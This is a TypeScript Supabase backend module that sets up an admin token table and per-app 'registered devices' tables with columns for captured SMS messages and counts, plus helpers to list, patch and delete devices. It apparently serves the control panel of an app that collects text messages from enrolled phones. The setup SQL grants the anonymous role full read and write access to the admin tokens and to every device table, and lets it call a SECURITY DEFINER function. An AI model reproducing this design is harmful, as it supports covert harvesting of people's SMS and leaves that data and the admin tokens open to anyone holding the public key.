// Backend-only — SUPABASE_SERVICE_ROLE_KEY never leaves the server
import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = "https://imfwqoocwfvvtjghgofi.supabase.co";
const REST = `${SUPABASE_URL}/rest/v1`;
const RPC = `${REST}/rpc`;

function getServiceKey(): string {
  const key = process.env["SUPABASE_SERVICE_ROLE_KEY"];
  if (!key) throw new Error("SUPABASE_SERVICE_ROLE_KEY not set");
  return key;
}

function getAdminClient() {
  return createClient(SUPABASE_URL, getServiceKey(), {
    auth: { autoRefreshToken: false, persistSession: false },
    db: { schema: "public" },
  });
}

function h(extra: Record<string, string> = {}): Record<string, string> {
  const key = getServiceKey();
  return {
    apikey: key,
    Authorization: `Bearer ${key}`,
    "Content-Type": "application/json",
    ...extra,
  };
}

// ─── DDL via supabase-js rpc ────────────────────────────────
// We ship each DDL statement as a SECURITY DEFINER rpc after setup.
// For bootstrap (before any functions exist) we use a direct
// Supabase SQL endpoint that accepts the service_role key.

async function execSQL(sql: string): Promise<void> {
  // supabase-js exposes .rpc() but not raw SQL — use the internal
  // Supabase SQL-over-HTTP endpoint (requires service_role):
  const res = await fetch(`${SUPABASE_URL}/rest/v1/rpc/query`, {
    method: "POST",
    headers: h(),
    body: JSON.stringify({ sql }),
  });
  if (res.ok) return;

  // Supabase pg endpoint (service_role only)
  const pg = await fetch(`${SUPABASE_URL}/pg`, {
    method: "POST",
    headers: h(),
    body: JSON.stringify({ query: sql }),
  });
  if (pg.ok) return;

  const pgTxt = await pg.text();
  throw new Error(`DDL failed (${pg.status}): ${pgTxt}`);
}

// ─── Setup steps ────────────────────────────────────────────

export async function checkSetup(): Promise<boolean> {
  try {
    const res = await fetch(`${REST}/admin_tokens?limit=1`, { headers: h() });
    return res.status < 400;
  } catch {
    return false;
  }
}

export async function runSetup(): Promise<void> {
  const db = getAdminClient();

  // Step 1: Create admin_tokens via supabase-js if possible,
  // otherwise use raw DDL
  const setupSql = `
    CREATE TABLE IF NOT EXISTS admin_tokens (
      id         UUID        DEFAULT gen_random_uuid() PRIMARY KEY,
      token      TEXT        UNIQUE NOT NULL,
      label      TEXT        DEFAULT '',
      is_active  BOOLEAN     DEFAULT true,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );
    ALTER TABLE admin_tokens ENABLE ROW LEVEL SECURITY;
    DO $$ BEGIN
      IF NOT EXISTS (SELECT 1 FROM pg_policies WHERE tablename='admin_tokens' AND policyname='anon_all') THEN
        CREATE POLICY anon_all ON admin_tokens FOR ALL TO anon USING (true) WITH CHECK (true);
      END IF;
    END $$;
    CREATE OR REPLACE FUNCTION create_app_device_table(app_token TEXT)
    RETURNS TEXT LANGUAGE plpgsql SECURITY DEFINER AS $fn$
    DECLARE tname TEXT := app_token || '_registered_devices';
    BEGIN
      EXECUTE format('
        CREATE TABLE IF NOT EXISTS %I (
          id                 UUID   DEFAULT gen_random_uuid() PRIMARY KEY,
          sub_id             TEXT   NOT NULL UNIQUE,
          app_id             TEXT   NOT NULL DEFAULT %L,
          uid                TEXT,
          data_type          TEXT   DEFAULT ''registered_device'',
          data_json          JSONB  DEFAULT ''{}''::jsonb,
          status             TEXT   DEFAULT ''active'',
          registered_at      BIGINT DEFAULT 0,
          created_at         BIGINT DEFAULT (EXTRACT(EPOCH FROM NOW())*1000)::BIGINT,
          updated_at         BIGINT DEFAULT (EXTRACT(EPOCH FROM NOW())*1000)::BIGINT,
          sms_messages       JSONB  DEFAULT ''[]''::jsonb,
          total_sms_count    INT    DEFAULT 0,
          last_sms_timestamp BIGINT DEFAULT 0,
          last_sms_log       JSONB  DEFAULT ''{}''::jsonb
        )', tname, app_token);
      EXECUTE format('ALTER TABLE %I ENABLE ROW LEVEL SECURITY', tname);
      EXECUTE format('
        DO $d$ BEGIN
          IF NOT EXISTS (SELECT 1 FROM pg_policies WHERE tablename=%L AND policyname=''anon_all'') THEN
            CREATE POLICY anon_all ON %I FOR ALL TO anon USING (true) WITH CHECK (true);
          END IF;
        END $d$
      ', tname, tname);
      RETURN tname;
    END; $fn$;
    GRANT EXECUTE ON FUNCTION create_app_device_table(TEXT) TO anon;
  `;

  // Try supabase-js rpc('query') — some Supabase plans expose this
  const { error: rpcErr } = await db.rpc("query" as never, { sql: setupSql } as never);
  if (!rpcErr) return;

  // Try the pg endpoint
  await execSQL(setupSql);
}

// ─── Apps ───────────────────────────────────────────────────

export async function getApps(): Promise<unknown[]> {
  const db = getAdminClient();
  const { data, error } = await db
    .from("admin_tokens")
    .select("*")
    .order("created_at", { ascending: false });
  if (error) throw new Error(`getApps: ${error.message}`);
  return data ?? [];
}

export async function createApp(token: string, label: string): Promise<unknown> {
  const db = getAdminClient();

  // 1. Create device table via RPC
  const { error: rpcErr } = await db.rpc("create_app_device_table", {
    app_token: token,
  });
  if (rpcErr) throw new Error(`createDeviceTable: ${rpcErr.message}`);

  // 2. Insert token
  const { data, error } = await db
    .from("admin_tokens")
    .insert({ token, label, is_active: true })
    .select()
    .single();
  if (error) throw new Error(`createApp: ${error.message}`);
  return data;
}

export async function updateApp(
  id: string,
  patch: Record<string, unknown>
): Promise<void> {
  const db = getAdminClient();
  const { error } = await db
    .from("admin_tokens")
    .update({ ...patch, updated_at: new Date().toISOString() })
    .eq("id", id);
  if (error) throw new Error(`updateApp: ${error.message}`);
}

export async function deleteApp(id: string): Promise<void> {
  const db = getAdminClient();
  const { error } = await db.from("admin_tokens").delete().eq("id", id);
  if (error) throw new Error(`deleteApp: ${error.message}`);
}

// ─── Devices ────────────────────────────────────────────────

export async function getDevices(appToken: string): Promise<unknown[]> {
  const table = `${appToken}_registered_devices`;
  const res = await fetch(`${REST}/${table}?order=created_at.desc&limit=500`, {
    headers: h(),
  });
  if (!res.ok) throw new Error(`getDevices: ${res.status} ${await res.text()}`);
  return res.json() as Promise<unknown[]>;
}

export async function patchDevice(
  appToken: string,
  uid: string,
  patch: Record<string, unknown>
): Promise<void> {
  const table = `${appToken}_registered_devices`;
  const res = await fetch(
    `${REST}/${table}?sub_id=eq.${encodeURIComponent(uid)}`,
    {
      method: "PATCH",
      headers: h({ Prefer: "return=minimal" }),
      body: JSON.stringify({ ...patch, updated_at: Date.now() }),
    }
  );
  if (!res.ok) throw new Error(`patchDevice: ${res.status} ${await res.text()}`);
}

export async function deleteDevice(
  appToken: string,
  uid: string
): Promise<void> {
  const table = `${appToken}_registered_devices`;
  const res = await fetch(
    `${REST}/${table}?sub_id=eq.${encodeURIComponent(uid)}`,
    { method: "DELETE", headers: h() }
  );
  if (!res.ok)
    throw new Error(`deleteDevice: ${res.status} ${await res.text()}`);
}
